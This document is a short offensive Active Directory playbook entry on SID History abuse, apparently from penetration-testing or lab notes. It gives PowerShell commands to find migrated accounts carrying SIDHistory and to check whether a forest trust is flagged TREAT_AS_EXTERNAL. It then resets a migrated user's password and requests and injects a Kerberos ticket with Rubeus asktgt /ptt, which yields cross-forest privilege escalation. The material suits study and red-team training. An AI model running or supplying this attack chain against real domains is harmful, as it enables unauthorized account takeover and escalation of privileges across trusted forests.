# 14.14 SID History Enumeration

> Find migrated users carrying SIDHistory from source domains — TrustAttributes `TREAT_AS_EXTERNAL` confirms cross-forest ExtraSIDs is usable.

## Overview

Enumerate accounts with SID History to find migrated users who retain privileges from their source domain. In cross-forest scenarios check TrustAttributes for TREAT_AS_EXTERNAL which indicates SID History is enabled between forests, allowing ExtraSIDs injection with RIDs > 1000.

## Steps

- **Get-ADUser -Filter "SIDHistory -Like '\*'"** — find accounts with SID history in current domain
- **Get-DomainTrust -domain logistics.ad | Where-Object** to check TrustAttributes for TREAT_AS_EXTERNAL
- If TREAT_AS_EXTERNAL present, enumerate high-privileged groups (RID > 1000) in the trusted forest with SharpHound/BloodHound
- Reset migrated user password if needed, then **Rubeus createnetonly** + **asktgt** to get a ticket

## Commands

### Enumerate SID History users

```powershell
PS C:\Tools>  Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory
```

### Check if SID History enabled on trust

```powershell
PS C:\Tools> Get-DomainTrust -domain logistics.ad | Where-Object {$_.TargetName -eq "<DOMAIN>.ad"} | Select TrustAttributes
```

### Reset migrated user password

```powershell
PS C:\Tools net user sentinal sentinal
```

### Request TGT for migrated user

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:sentinal /password:sentinal /domain:<DOMAIN>.ad /ptt
```

### Get Infrastructure group SID from logistics

```powershell
PS C:\Tools> Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"
```
